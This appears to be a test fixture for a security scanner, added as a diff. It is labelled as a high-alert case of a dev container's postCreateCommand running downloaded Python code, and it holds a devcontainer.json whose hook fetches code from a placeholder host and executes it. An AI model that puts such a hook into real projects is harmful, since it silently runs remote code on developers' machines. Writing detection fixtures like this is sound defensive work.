@@ -1,0 +1,8 @@
+postCreateCommand executing downloaded Python code.
+alert: high
+-- .devcontainer/devcontainer.json --
+{
+  "name": "dev",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://example.invalid/p').read())\""
+}
